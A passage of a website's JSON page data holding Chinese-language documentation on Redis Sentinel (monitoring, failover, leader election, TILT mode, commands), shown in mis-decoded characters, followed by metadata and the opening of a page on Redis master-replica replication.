ç½®è®¾ç½®å°è¢«çè§çå®ä¾ä¸é¢ã ç¹å«æ¯ï¼æ ¹æ®å½åçéç½®ï¼ å¦æä¸ä¸ª slave è¢«å®£åä¸º masterï¼ é£ä¹å®ä¼ä»£æ¿åæç masterï¼ æä¸ºæ°ç masterï¼ å¹¶ä¸æä¸ºåæ master çææ slave çå¤å¶å¯¹è±¡ã é£äºè¿æ¥äºéè¯¯ master ç slave ä¼è¢«éæ°éç½®ï¼ ä½¿å¾è¿äº slave ä¼å»å¤å¶æ­£ç¡®ç masterã\n\nä¸è¿ï¼ å¨ä»¥ä¸è¿äºæ¡ä»¶æ»¡è¶³ä¹åï¼ Sentinel å¨å¯¹å®ä¾è¿è¡éæ°éç½®ä¹åä»ç¶ä¼ç­å¾ä¸æ®µè¶³å¤é¿çæ¶é´ï¼ ç¡®ä¿å¯ä»¥æ¥æ¶å°å¶ä» Sentinel åæ¥çéç½®æ´æ°ï¼ ä»èé¿åèªèº«å ä¸ºä¿å­äºè¿æçéç½®èå¯¹å®ä¾è¿è¡äºä¸å¿è¦çéæ°éç½®ã\n\n\n# TILT æ¨¡å¼\n\nRedis Sentinel ä¸¥éä¾èµè®¡ç®æºçæ¶é´åè½ï¼ æ¯å¦è¯´ï¼ ä¸ºäºå¤æ­ä¸ä¸ªå®ä¾æ¯å¦å¯ç¨ï¼ Sentinel ä¼è®°å½è¿ä¸ªå®ä¾æåä¸æ¬¡ç¸åº PING å½ä»¤çæ¶é´ï¼ å¹¶å°è¿ä¸ªæ¶é´åå½åæ¶é´è¿è¡å¯¹æ¯ï¼ ä»èç¥éè¿ä¸ªå®ä¾æå¤é¿æ¶é´æ²¡æå Sentinel è¿è¡ä»»ä½æåéè®¯ã\n\nä¸è¿ï¼ ä¸æ¦è®¡ç®æºçæ¶é´åè½åºç°æéï¼ æèè®¡ç®æºéå¸¸å¿ç¢ï¼ åæèè¿ç¨å ä¸ºæäºåå èè¢«é»å¡æ¶ï¼ Sentinel å¯è½ä¹ä¼è·çåºç°æéã\n\nTILT æ¨¡å¼æ¯ä¸ç§ç¹æ®çä¿æ¤æ¨¡å¼ï¼ å½ Sentinel åç°ç³»ç»æäºä¸å¯¹å²æ¶ï¼ Sentinel å°±ä¼è¿å¥ TILT æ¨¡å¼ã\n\nå ä¸º Sentinel çæ¶é´ä¸­æ­å¨é»è®¤æ¯ç§æ§è¡ 10 æ¬¡ï¼ æä»¥æä»¬é¢ææ¶é´ä¸­æ­å¨çä¸¤æ¬¡æ§è¡ä¹é´çé´éä¸º 100 æ¯«ç§å·¦å³ã Sentinel çåæ³æ¯ï¼ è®°å½ä¸ä¸æ¬¡æ¶é´ä¸­æ­å¨æ§è¡æ¶çæ¶é´ï¼ å¹¶å°å®åè¿ä¸æ¬¡æ¶é´ä¸­æ­å¨æ§è¡çæ¶é´è¿è¡å¯¹æ¯ï¼\n\nå¦æä¸¤æ¬¡è°ç¨æ¶é´ä¹é´çå·®è·ä¸ºè´å¼ï¼ æèéå¸¸å¤§ï¼è¶è¿ 2 ç§éï¼ï¼ é£ä¹ Sentinel è¿å¥ TILT æ¨¡å¼ã\nå¦æ Sentinel å·²ç»è¿å¥ TILT æ¨¡å¼ï¼ é£ä¹ Sentinel å»¶è¿éåº TILT æ¨¡å¼çæ¶é´ã\n\nå½ Sentinel è¿å¥ TILT æ¨¡å¼æ¶ï¼ å®ä»ç¶ä¼ç»§ç»­çè§ææç®æ ï¼ ä½æ¯ï¼å®ä¸åæ§è¡ä»»ä½æä½ï¼æ¯å¦æéè½¬ç§»ãå½æå®ä¾åè¿ä¸ª Sentinel åé SENTINEL is-master-down-by-addr å½ä»¤æ¶ï¼ Sentinel è¿åè´å¼ï¼ å ä¸ºè¿ä¸ª Sentinel æè¿è¡çä¸çº¿å¤æ­å·²ç»ä¸ååç¡®ãå¦æ TILT å¯ä»¥æ­£å¸¸ç»´æ 30 ç§éï¼ é£ä¹ Sentinel éåº TILT æ¨¡å¼ã\n\n\n# Sentinel å½ä»¤\n\nä»¥ä¸ååºçæ¯ Sentinel æ¥åçå½ä»¤ï¼\n\nå½ä»¤                                 æè¿°\nPING                               å¦æåé¢æ²¡æåæ°æ¶è¿å\n                                   PONGï¼å¦åä¼è¿ååé¢å¸¦çåæ°ãè¿ä¸ªå½ä»¤ç»å¸¸ç¨æ¥æµè¯ä¸ä¸ªè¿æ¥æ¯å¦è¿æ¯å¯ç¨çï¼æèç¨æ¥æµè¯ä¸ä¸ªè¿æ¥çå»¶æ¶ãå¦æå®¢æ·ç«¯å¤äºé¢éè®¢éæ¨¡å¼ä¸ï¼å®å°æ¯ä¸ä¸ª\n                                   multi-bulk è¿åï¼ç¬¬ä¸æ¬¡æ¶è¿åâpongâï¼ä¹åè¿åç©ºï¼empty bulkï¼ï¼é¤éå½ä»¤åé¢æ´éäºåæ°ã\nSENTINEL masters                   ååºææè¢«çè§ç masterï¼ä»¥åè¿äº master çå½åç¶æã\nSENTINEL slaves                    ååºç»å® master çææ slave ï¼ä»¥åè¿äº slave çå½åç¶æ\nSENTINEL get-master-addr-by-name   è¿åç»å®åå­ç master ç IP å°ååç«¯å£å·ã å¦æè¿ä¸ª master æ­£å¨æ§è¡æéè½¬ç§»æä½ï¼ æèéå¯¹è¿ä¸ª\n                                   master çæéè½¬ç§»æä½å·²ç»å®æï¼ é£ä¹è¿ä¸ªå½ä»¤è¿åæ°ç master ç IP å°ååç«¯å£å·\nSENTINEL reset                     éç½®ææåå­åç»å®æ¨¡å¼ pattern ç¸å¹éç master ã pattern åæ°æ¯ä¸ä¸ª Glob é£æ ¼çæ¨¡å¼ã\n                                   éç½®æä½æ¸æ¥ master ç®åçææç¶æï¼ åæ¬æ­£å¨æ§è¡ä¸­çæéè½¬ç§»ï¼ å¹¶ç§»é¤ç®åå·²ç»åç°åå³èçï¼ master\n                                   çææ slave å Sentinel\nSENTINEL failover                  å½ master å¤±ææ¶ï¼ å¨ä¸è¯¢é®å¶ä» Sentinel æè§çæåµä¸ï¼ å¼ºå¶å¼å§ä¸æ¬¡èªå¨æéè¿ç§»\n                                   ï¼ä¸è¿åèµ·æéè½¬ç§»ç Sentinel ä¼åå¶ä» Sentinel åéä¸ä¸ªæ°çéç½®ï¼å¶ä» Sentinel\n                                   ä¼æ ¹æ®è¿ä¸ªéç½®è¿è¡ç¸åºçæ´æ°ï¼",normalizedContent:"# ç®ä»\n\nredis ç sentinel ç³»ç»ç¨äºç®¡çå¤ä¸ª redis æå¡å¨ï¼ è¯¥ç³»ç»æ§è¡ä»¥ä¸ä¸ä¸ªä»»å¡ï¼\n\n * çæ§ï¼monitoringï¼ï¼ sentinel ä¼ä¸æ­å°æ£æ¥ä½ ç master å slave æ¯å¦è¿ä½æ­£å¸¸ã\n * æéï¼notificationï¼ï¼ å½è¢«çæ§çæä¸ª redis æå¡å¨åºç°é®é¢æ¶ï¼ sentinel å¯ä»¥éè¿ api åç®¡çåæèå¶ä»åºç¨ç¨åºåééç¥ã\n * èªå¨æéè¿ç§»ï¼automatic failoverï¼ï¼ å½ä¸ä¸ª master ä¸è½æ­£å¸¸å·¥ä½æ¶ï¼ sentinel ä¼å¼å§ä¸æ¬¡èªå¨æéè¿ç§»æä½ï¼ å®ä¼å°å¤±æ master çå¶ä¸­ä¸ä¸ª slave åçº§ä¸ºæ°ç masterï¼ å¹¶è®©å¤±æ master çå¶ä» slave æ¹ä¸ºå¤å¶æ°ç masterï¼ å½å®¢æ·ç«¯è¯å¾è¿æ¥å¤±æç master æ¶ï¼ éç¾¤ä¹ä¼åå®¢æ·ç«¯è¿åæ° master çå°åï¼ ä½¿å¾éç¾¤å¯ä»¥ä½¿ç¨æ° master ä»£æ¿å¤±ææå¡å¨ã\n\n\n\nå¨é»è®¤æåµä¸ï¼ sentinel ä½¿ç¨ tcp ç«¯å£ 26379 ï¼æ®é redis æå¡å¨ä½¿ç¨çæ¯ 6379 ï¼ã\n\nsentinel æ¥å redis åè®®æ ¼å¼çå½ä»¤è¯·æ±ï¼ æä»¥ä½ å¯ä»¥ä½¿ç¨ redis-cli æèä»»ä½å¶ä» redis å®¢æ·ç«¯æ¥ä¸ sentinel è¿è¡éè®¯ã\n\næä¸¤ç§æ¹å¼å¯ä»¥å sentinel è¿è¡éè®¯ï¼\n\n * ç¬¬ä¸ç§æ¹æ³æ¯éè¿ç´æ¥åéå½ä»¤æ¥æ¥è¯¢è¢«çè§ redis æå¡å¨çå½åç¶æï¼ ä»¥å sentinel æç¥éçå³äºå¶ä» sentinel çä¿¡æ¯ï¼ è¯¸å¦æ­¤ç±»ã\n * å¦ä¸ç§æ¹æ³æ¯ä½¿ç¨åå¸ä¸è®¢éåè½ï¼ éè¿æ¥æ¶ sentinel åéçéç¥ï¼ å½æ§è¡æéè½¬ç§»æä½ï¼ æèæä¸ªè¢«çè§çæå¡å¨è¢«å¤æ­ä¸ºä¸»è§ä¸çº¿æèå®¢è§ä¸çº¿æ¶ï¼ sentinel å°±ä¼åéç¸åºçä¿¡æ¯ã\n\n\n# æ¯ä¸ª sentinel é½éè¦å®ææ§è¡çä»»å¡\n\næ¯ä¸ª sentinel ä»¥æ¯ç§éä¸æ¬¡çé¢çåå®æç¥ç master ãslave ä»¥åå¶ä» sentinel å®ä¾åéä¸ä¸ª ping å½ä»¤ã\n\nå¦æä¸ä¸ªå®ä¾ï¼instanceï¼è·ç¦»æåä¸æ¬¡ææåå¤ ping å½ä»¤çæ¶é´è¶è¿ down-after-milliseconds éé¡¹ææå®çå¼ï¼ é£ä¹è¿ä¸ªå®ä¾ä¼è¢« sentinel æ è®°ä¸ºä¸»è§ä¸çº¿ã ä¸ä¸ªææåå¤å¯ä»¥æ¯ï¼ +pong ã -loading æè -masterdown ã\n\nå¦æä¸ä¸ª master è¢«æ è®°ä¸ºä¸»è§ä¸çº¿ï¼ é£ä¹æ­£å¨çè§è¿ä¸ª master çææ sentinel è¦ä»¥æ¯ç§ä¸æ¬¡çé¢çç¡®è®¤ master çç¡®è¿å¥äºä¸»è§ä¸çº¿ç¶æã\n\nå¦æä¸ä¸ª master è¢«æ è®°ä¸ºä¸»è§ä¸çº¿ï¼ å¹¶ä¸æè¶³å¤æ°éç sentinel ï¼è³å°è¦è¾¾å°éç½®æä»¶æå®çæ°éï¼å¨æå®çæ¶é´èå´ååæè¿ä¸å¤æ­ï¼ é£ä¹è¿ä¸ª master è¢«æ è®°ä¸ºå®¢è§ä¸çº¿ã\n\nå¨ä¸è¬æåµä¸ï¼ æ¯ä¸ª sentinel ä¼ä»¥æ¯ 10 ç§ä¸æ¬¡çé¢çåå®å·²ç¥çææ master å slave åé info å½ä»¤ã å½ä¸ä¸ª master è¢« sentinel æ è®°ä¸ºå®¢è§ä¸çº¿æ¶ï¼ sentinel åä¸çº¿ master çææ slave åé info å½ä»¤çé¢çä¼ä» 10 ç§ä¸æ¬¡æ¹ä¸ºæ¯ç§ä¸æ¬¡ã\n\nå½æ²¡æè¶³å¤æ°éç sentinel åæ master å·²ç»ä¸çº¿ï¼ master çå®¢è§ä¸çº¿ç¶æå°±ä¼è¢«ç§»é¤ã å½ master éæ°å sentinel ç ping å½ä»¤è¿åææåå¤æ¶ï¼ master çä¸»è§ä¸çº¿ç¶æå°±ä¼è¢«ç§»é¤ã\n\n\n# èªå¨åç° sentinel åä»æå¡å¨\n\nä¸ä¸ª sentinel å¯ä»¥ä¸å¶ä»å¤ä¸ª sentinel è¿è¡è¿æ¥ï¼ åä¸ª sentinel ä¹é´å¯ä»¥äºç¸æ£æ¥å¯¹æ¹çå¯ç¨æ§ï¼ å¹¶è¿è¡ä¿¡æ¯äº¤æ¢ã\n\nä½ æ é¡»ä¸ºè¿è¡çæ¯ä¸ª sentinel åå«è®¾ç½®å¶ä» sentinel çå°åï¼ å ä¸º sentinel å¯ä»¥éè¿åå¸ä¸è®¢éåè½æ¥èªå¨åç°æ­£å¨çè§ç¸å master çå¶ä» sentinel ï¼ è¿ä¸åè½æ¯éè¿åé¢é sentinel:hello åéä¿¡æ¯æ¥å®ç°çã\n\nä¸æ­¤ç±»ä¼¼ï¼ ä½ ä¹ä¸å¿æå¨ååº master å±ä¸çææ slave ï¼ å ä¸º sentinel å¯ä»¥éè¿è¯¢é® master æ¥è·å¾ææ slave çä¿¡æ¯ã\n\næ¯ä¸ª sentinel ä¼ä»¥æ¯ä¸¤ç§ä¸æ¬¡çé¢çï¼ éè¿åå¸ä¸è®¢éåè½ï¼ åè¢«å®çè§çææ master å slave ç sentinel:hello é¢éåéä¸æ¡ä¿¡æ¯ï¼ ä¿¡æ¯ä¸­åå«äº sentinel ç ip å°åãç«¯å£å·åè¿è¡ id ï¼runidï¼ã\n\næ¯ä¸ª sentinel é½è®¢éäºè¢«å®çè§çææ master å slave ç sentinel:hello é¢éï¼ æ¥æ¾ä¹åæªåºç°è¿ç sentinel ï¼looking for unknown sentinelsï¼ã å½ä¸ä¸ª sentinel åç°ä¸ä¸ªæ°ç sentinel æ¶ï¼ å®ä¼å°æ°ç sentinel æ·»å å°ä¸ä¸ªåè¡¨ä¸­ï¼ è¿ä¸ªåè¡¨ä¿å­äº sentinel å·²ç¥çï¼ çè§åä¸ä¸ª master çææå¶ä» sentinel ã\n\nsentinel åéçä¿¡æ¯ä¸­è¿åæ¬å®æ´ç master å½åéç½®ï¼configurationï¼ã å¦æä¸ä¸ª sentinel åå«ç master éç½®æ¯å¦ä¸ä¸ª sentinel åéçéç½®è¦æ§ï¼ é£ä¹è¿ä¸ª sentinel ä¼ç«å³åçº§å°æ°éç½®ä¸ã\n\nå¨å°ä¸ä¸ªæ° sentinel æ·»å å°çè§ master çåè¡¨ä¸é¢ä¹åï¼ sentinel ä¼åæ£æ¥åè¡¨ä¸­æ¯å¦å·²ç»åå«äºåè¦æ·»å ç sentinel æ¥æç¸åè¿è¡ id æèç¸åå°åï¼åæ¬ ip å°ååç«¯å£å·ï¼ç sentinel ï¼ å¦ææ¯çè¯ï¼ sentinel ä¼åç§»é¤åè¡¨ä¸­å·²æçé£äºæ¥æç¸åè¿è¡ id æèç¸åå°åç sentinel ï¼ ç¶ååæ·»å æ° sentinel ã\n\n\n# æéè½¬ç§»\n\nä¸æ¬¡æéè½¬ç§»æä½ç±ä»¥ä¸æ­¥éª¤ç»æï¼\n\n * åç° master å·²ç»è¿å¥å®¢è§ä¸çº¿ç¶æã\n * å¯¹æä»¬çå½å epoch å¼è¿è¡èªå¢ï¼ å¹¶å°è¯å¨è¿ä¸ª epoch å¼ä¸­å½éã\n * å¦æå½éå¤±è´¥ï¼ é£ä¹å¨è®¾å®çæéè¿ç§»è¶æ¶æ¶é´çä¸¤åä¹åï¼ éæ°å°è¯å½éã å¦æå½éæåï¼ é£ä¹æ§è¡ä»¥ä¸æ­¥éª¤ã\n * éåºä¸ä¸ª slaveï¼å¹¶å°å®åçº§ä¸º masterã\n * åè¢«éä¸­ç slave åéÂ  slaveof no one Â å½ä»¤ï¼è®©å®è½¬åä¸º masterã\n * éè¿åå¸ä¸è®¢éåè½ï¼ å°æ´æ°åçéç½®ä¼ æ­ç»ææå¶ä» sentinel ï¼ å¶ä» sentinel å¯¹å®ä»¬èªå·±çéç½®è¿è¡æ´æ°ã\n * åå·²ä¸çº¿ master ç slave åéÂ slaveof å½ä»¤ï¼ è®©å®ä»¬å»å¤å¶æ°ç masterã\n * å½ææ slave é½å·²ç»å¼å§å¤å¶æ°ç master æ¶ï¼ é¢å¤´ sentinel ç»æ­¢è¿æ¬¡æéè¿ç§»æä½ã\n\næ¯å½ä¸ä¸ª redis å®ä¾è¢«éæ°éç½®ï¼reconfiguredï¼ ââ æ è®ºæ¯è¢«è®¾ç½®æ masterãslaveãåæèè¢«è®¾ç½®æå¶ä» master ç slave ââ sentinel é½ä¼åè¢«éæ°éç½®çå®ä¾åéä¸ä¸ª config rewrite å½ä»¤ï¼ ä»èç¡®ä¿è¿äºéç½®ä¼æä¹åå¨ç¡¬çéã\n\nsentinel ä½¿ç¨ä»¥ä¸è§åæ¥éæ©æ°ç masterï¼\n\n * å¨å¤±æ master å±ä¸ç slave å½ä¸­ï¼ é£äºè¢«æ è®°ä¸ºä¸»è§ä¸çº¿ãå·²æ­çº¿ãæèæåä¸æ¬¡åå¤Â pingÂ å½ä»¤çæ¶é´å¤§äºäºç§éç slave é½ä¼è¢«æ·æ±°ã\n * å¨å¤±æ master å±ä¸ç slave å½ä¸­ï¼ é£äºä¸å¤±æ master è¿æ¥æ­å¼çæ¶é¿è¶è¿ down-after éé¡¹æå®çæ¶é¿ååç slave é½ä¼è¢«æ·æ±°ã\n * å¨ç»åäºä»¥ä¸ä¸¤è½®æ·æ±°ä¹åå©ä¸æ¥ç slave ä¸­ï¼ æä»¬éåºå¤å¶åç§»éï¼replication offsetï¼æå¤§çé£ä¸ª slave ä½ä¸ºæ°ç masterï¼ å¦æå¤å¶åç§»éä¸å¯ç¨ï¼ æè slave çå¤å¶åç§»éç¸åï¼ é£ä¹å¸¦ææå°è¿è¡ id çé£ä¸ª slave æä¸ºæ°ç masterã\n\n\n# sentinel èªå¨æéè¿ç§»çä¸è´æ§ç¹è´¨\n\nsentinel èªå¨æéè¿ç§»ä½¿ç¨ raft ç®æ³æ¥éä¸¾ leaderï¼ç»é¿ï¼sentinel ï¼ ä»èç¡®ä¿å¨ä¸ä¸ªç»å®ç epoch å¼éï¼ åªæä¸ä¸ª leader äº§çã\n\nè¿è¡¨ç¤ºå¨åä¸ä¸ª epoch å¼ä¸­ï¼ ä¸ä¼æä¸¤ä¸ª sentinel åæ¶è¢«éä¸­ä¸º leaderï¼ å¹¶ä¸åä¸ª sentinel å¨åä¸ä¸ª epoch å¼ä¸­åªä¼å¯¹ä¸ä¸ª leader è¿è¡æç¥¨ã\n\næ´é«çéç½® epoch å¼æ»æ¯ä¼äºè¾ä½ç epoch å¼ï¼ å æ­¤æ¯ä¸ª sentinel é½ä¼ä¸»å¨ä½¿ç¨æ´æ°ç epoch å¼æ¥ä»£æ¿èªå·±çéç½®ã\n\nç®åæ¥è¯´ï¼ æä»¬å¯ä»¥å° sentinel éç½®çä½æ¯ä¸ä¸ªå¸¦æçæ¬å·çç¶æã ä¸ä¸ªç¶æä¼ä»¥æååå¥èèåºï¼last-write-winsï¼çæ¹å¼ï¼ä¹å³æ¯ï¼ææ°çéç½®æ»æ¯èåºï¼ä¼ æ­è³ææå¶ä» sentinel ã\n\nä¸¾ä¸ªä¾å­ï¼ å½åºç°ç½ç»åå²ï¼network partitionsï¼æ¶ï¼ ä¸ä¸ª sentinel å¯è½ä¼åå«äºè¾æ§çéç½®ï¼ èå½è¿ä¸ª sentinel æ¥å°å¶ä» sentinel åæ¥ççæ¬æ´æ°çéç½®æ¶ï¼ sentinel å°±ä¼å¯¹èªå·±çéç½®è¿è¡æ´æ°ã\n\nå¦æè¦å¨ç½ç»åå²åºç°çæåµä¸ä»ç¶ä¿æä¸è´æ§ï¼ é£ä¹åºè¯¥ä½¿ç¨ min-slaves-to-write éé¡¹ï¼ è®© master å¨è¿æ¥çä»å®ä¾å°äºç»å®æ°éæ¶åæ­¢æ§è¡åæä½ï¼ ä¸æ­¤åæ¶ï¼ åºè¯¥å¨æ¯ä¸ªè¿è¡ redis master æ slave çæºå¨ä¸è¿è¡ redis sentinel è¿ç¨ã\n\n\n# sentinel ç¶æçæä¹å\n\nsentinel çç¶æä¼è¢«æä¹åå¨ sentinel éç½®æä»¶éé¢ã\n\næ¯å½ sentinel æ¥æ¶å°ä¸ä¸ªæ°çéç½®ï¼ æèå½ç»é¿ sentinel ä¸º master åå»ºä¸ä¸ªæ°çéç½®æ¶ï¼ è¿ä¸ªéç½®ä¼ä¸éç½® epoch å¼ä¸èµ·è¢«ä¿å­å°ç£çéé¢ã\n\nè¿æå³çåæ­¢åéå¯ sentinel è¿ç¨é½æ¯å®å¨çã\n\n\n# sentinel å¨éæéè¿ç§»çæåµä¸å¯¹å®ä¾è¿è¡éæ°éç½®\n\nå³ä½¿æ²¡æèªå¨æéè¿ç§»æä½å¨è¿è¡ï¼ sentinel æ»ä¼å°è¯å°å½åçéç½®è®¾ç½®å°è¢«çè§çå®ä¾ä¸é¢ã ç¹å«æ¯ï¼æ ¹æ®å½åçéç½®ï¼ å¦æä¸ä¸ª slave è¢«å®£åä¸º masterï¼ é£ä¹å®ä¼ä»£æ¿åæç masterï¼ æä¸ºæ°ç masterï¼ å¹¶ä¸æä¸ºåæ master çææ slave çå¤å¶å¯¹è±¡ã é£äºè¿æ¥äºéè¯¯ master ç slave ä¼è¢«éæ°éç½®ï¼ ä½¿å¾è¿äº slave ä¼å»å¤å¶æ­£ç¡®ç masterã\n\nä¸è¿ï¼ å¨ä»¥ä¸è¿äºæ¡ä»¶æ»¡è¶³ä¹åï¼ sentinel å¨å¯¹å®ä¾è¿è¡éæ°éç½®ä¹åä»ç¶ä¼ç­å¾ä¸æ®µè¶³å¤é¿çæ¶é´ï¼ ç¡®ä¿å¯ä»¥æ¥æ¶å°å¶ä» sentinel åæ¥çéç½®æ´æ°ï¼ ä»èé¿åèªèº«å ä¸ºä¿å­äºè¿æçéç½®èå¯¹å®ä¾è¿è¡äºä¸å¿è¦çéæ°éç½®ã\n\n\n# tilt æ¨¡å¼\n\nredis sentinel ä¸¥éä¾èµè®¡ç®æºçæ¶é´åè½ï¼ æ¯å¦è¯´ï¼ ä¸ºäºå¤æ­ä¸ä¸ªå®ä¾æ¯å¦å¯ç¨ï¼ sentinel ä¼è®°å½è¿ä¸ªå®ä¾æåä¸æ¬¡ç¸åº ping å½ä»¤çæ¶é´ï¼ å¹¶å°è¿ä¸ªæ¶é´åå½åæ¶é´è¿è¡å¯¹æ¯ï¼ ä»èç¥éè¿ä¸ªå®ä¾æå¤é¿æ¶é´æ²¡æå sentinel è¿è¡ä»»ä½æåéè®¯ã\n\nä¸è¿ï¼ ä¸æ¦è®¡ç®æºçæ¶é´åè½åºç°æéï¼ æèè®¡ç®æºéå¸¸å¿ç¢ï¼ åæèè¿ç¨å ä¸ºæäºåå èè¢«é»å¡æ¶ï¼ sentinel å¯è½ä¹ä¼è·çåºç°æéã\n\ntilt æ¨¡å¼æ¯ä¸ç§ç¹æ®çä¿æ¤æ¨¡å¼ï¼ å½ sentinel åç°ç³»ç»æäºä¸å¯¹å²æ¶ï¼ sentinel å°±ä¼è¿å¥ tilt æ¨¡å¼ã\n\nå ä¸º sentinel çæ¶é´ä¸­æ­å¨é»è®¤æ¯ç§æ§è¡ 10 æ¬¡ï¼ æä»¥æä»¬é¢ææ¶é´ä¸­æ­å¨çä¸¤æ¬¡æ§è¡ä¹é´çé´éä¸º 100 æ¯«ç§å·¦å³ã sentinel çåæ³æ¯ï¼ è®°å½ä¸ä¸æ¬¡æ¶é´ä¸­æ­å¨æ§è¡æ¶çæ¶é´ï¼ å¹¶å°å®åè¿ä¸æ¬¡æ¶é´ä¸­æ­å¨æ§è¡çæ¶é´è¿è¡å¯¹æ¯ï¼\n\nå¦æä¸¤æ¬¡è°ç¨æ¶é´ä¹é´çå·®è·ä¸ºè´å¼ï¼ æèéå¸¸å¤§ï¼è¶è¿ 2 ç§éï¼ï¼ é£ä¹ sentinel è¿å¥ tilt æ¨¡å¼ã\nå¦æ sentinel å·²ç»è¿å¥ tilt æ¨¡å¼ï¼ é£ä¹ sentinel å»¶è¿éåº tilt æ¨¡å¼çæ¶é´ã\n\nå½ sentinel è¿å¥ tilt æ¨¡å¼æ¶ï¼ å®ä»ç¶ä¼ç»§ç»­çè§ææç®æ ï¼ ä½æ¯ï¼å®ä¸åæ§è¡ä»»ä½æä½ï¼æ¯å¦æéè½¬ç§»ãå½æå®ä¾åè¿ä¸ª sentinel åé sentinel is-master-down-by-addr å½ä»¤æ¶ï¼ sentinel è¿åè´å¼ï¼ å ä¸ºè¿ä¸ª sentinel æè¿è¡çä¸çº¿å¤æ­å·²ç»ä¸ååç¡®ãå¦æ tilt å¯ä»¥æ­£å¸¸ç»´æ 30 ç§éï¼ é£ä¹ sentinel éåº tilt æ¨¡å¼ã\n\n\n# sentinel å½ä»¤\n\nä»¥ä¸ååºçæ¯ sentinel æ¥åçå½ä»¤ï¼\n\nå½ä»¤                                 æè¿°\nping                               å¦æåé¢æ²¡æåæ°æ¶è¿å\n                                   pongï¼å¦åä¼è¿ååé¢å¸¦çåæ°ãè¿ä¸ªå½ä»¤ç»å¸¸ç¨æ¥æµè¯ä¸ä¸ªè¿æ¥æ¯å¦è¿æ¯å¯ç¨çï¼æèç¨æ¥æµè¯ä¸ä¸ªè¿æ¥çå»¶æ¶ãå¦æå®¢æ·ç«¯å¤äºé¢éè®¢éæ¨¡å¼ä¸ï¼å®å°æ¯ä¸ä¸ª\n                                   multi-bulk è¿åï¼ç¬¬ä¸æ¬¡æ¶è¿åâpongâï¼ä¹åè¿åç©ºï¼empty bulkï¼ï¼é¤éå½ä»¤åé¢æ´éäºåæ°ã\nsentinel masters                   ååºææè¢«çè§ç masterï¼ä»¥åè¿äº master çå½åç¶æã\nsentinel slaves                    ååºç»å® master çææ slave ï¼ä»¥åè¿äº slave çå½åç¶æ\nsentinel get-master-addr-by-name   è¿åç»å®åå­ç master ç ip å°ååç«¯å£å·ã å¦æè¿ä¸ª master æ­£å¨æ§è¡æéè½¬ç§»æä½ï¼ æèéå¯¹è¿ä¸ª\n                                   master çæéè½¬ç§»æä½å·²ç»å®æï¼ é£ä¹è¿ä¸ªå½ä»¤è¿åæ°ç master ç ip å°ååç«¯å£å·\nsentinel reset                     éç½®ææåå­åç»å®æ¨¡å¼ pattern ç¸å¹éç master ã pattern åæ°æ¯ä¸ä¸ª glob é£æ ¼çæ¨¡å¼ã\n                                   éç½®æä½æ¸æ¥ master ç®åçææç¶æï¼ åæ¬æ­£å¨æ§è¡ä¸­çæéè½¬ç§»ï¼ å¹¶ç§»é¤ç®åå·²ç»åç°åå³èçï¼ master\n                                   çææ slave å sentinel\nsentinel failover                  å½ master å¤±ææ¶ï¼ å¨ä¸è¯¢é®å¶ä» sentinel æè§çæåµä¸ï¼ å¼ºå¶å¼å§ä¸æ¬¡èªå¨æéè¿ç§»\n                                   ï¼ä¸è¿åèµ·æéè½¬ç§»ç sentinel ä¼åå¶ä» sentinel åéä¸ä¸ªæ°çéç½®ï¼å¶ä» sentinel\n                                   ä¼æ ¹æ®è¿ä¸ªéç½®è¿è¡ç¸åºçæ´æ°ï¼",charsets:{cjk:!0}},{title:"Redisé«å¯ç¨(ä¸) ä¸»ä»çè®º",frontmatter:{title:"Redisé«å¯ç¨(ä¸) ä¸»ä»çè®º",date:"2023-06-25T09:22:36.000Z",permalink:"/Redis/1607",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1607.Redis%E9%AB%98%E5%8F%AF%E7%94%A8(%E4%B8%80)%20%E4%B8%BB%E4%BB%8E%E7%90%86%E8%AE%BA.html",relativePath:"02.ä¸­é´ä»¶/03.redis/1607.Redisé«å¯ç¨(ä¸) ä¸»ä»çè®º.md",key:"v-315575a6",path:"/Redis/1607/",headers:[{level:2,title:"å¤å¶",slug:"å¤å¶",normalizedTitle:"å¤å¶",charIndex:17},{level:2,title:"å·¥ä½æ¨¡å¼",slug:"å·¥ä½æ¨¡å¼",normalizedTitle:"å·¥ä½æ¨¡å¼",charIndex:1895},{level:3,title:"1. è®¾ç½®ä¸»æå¡çå°åä¸ç«¯å£",slug:"_1-è®¾ç½®ä¸»æå¡çå°åä¸ç«¯å£",normalizedTitle:"1. è®¾ç½®ä¸»æå¡çå°åä¸ç«¯å£",charIndex:1939},{level:3,title:"2. å»ºç«å¥æ¥å­è¿æ¥",slug:"_2-å»ºç«å¥æ¥å­è¿æ¥",normalizedTitle:"2. å»ºç«å¥æ¥å­è¿æ¥",charIndex:2114},{level:3,title:"3. åéPINGå½ä»¤",slug:"_3-åépingå½ä»¤",normalizedTitle:"3. åé ping å½ä»¤",charIndex:2267},{level:3,title:"4. èº«ä»½éªè¯",slug:"_4-èº«ä»½éªè¯",normalizedTitle:"4. èº«ä»½éªè¯",charIndex:2775},{level:3,title:"5. åéç«¯å£ä¿¡æ¯",slug:"_5-åéç«¯å£ä¿¡æ¯",normalizedTitle:"5. åéç«¯å£ä¿¡æ¯",charIndex:3304},{level:3,title:"6. åæ­¥ 7. å½ä»¤ä¼ æ­",slug:"_6-åæ­¥-7-å½ä»¤ä¼ æ­",normalizedTitle:"6. åæ­¥ 7. å½ä»¤ä¼ æ­",charIndex:3399}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"å¤å¶ å·¥ä½æ¨¡å¼ 1. è®¾ç½®ä¸»æå¡çå°åä¸ç«¯å£ 2. å»ºç«å¥æ¥å­è¿æ¥ 3. åéPINGå½ä»¤ 4. èº«ä»½éªè¯ 5. åéç«¯å£ä¿¡æ¯ 6. åæ­¥ 7. å½ä»¤ä¼ æ­",content:"Redis é«å¯ç¨ä¸»è¦æ¯ä½¿ç¨ ä¸»ä»å¤å¶ å å¨åµæ¥åï¼éç¾¤ä¸è½ç®æ¯é«å¯ç¨ï¼å ä¸ºå½èç¹ B æå¤§éçæ°æ®ï¼å¦æèç¹ B ææï¼å°±åæ æ³è®¿é®å°èç¹ B çæ°æ®ï¼å ä¸ºå¶ä»èç¹å¹¶ä¸ä¼æèç¹ B çæ°æ®ãå¶ä¸­çåå è·æ¬èº« Redis çè®¾è®¡æå³ã\n\n\n# å¤å¶\n\nä½¿ç¨åéç½®ä¸»ä»å¤å¶éå¸¸ç®åï¼ä» Redis æå¡å¨ï¼ä¸æç§° slaveï¼è½ç²¾ç¡®å¾å¤å¶ä¸» Redis 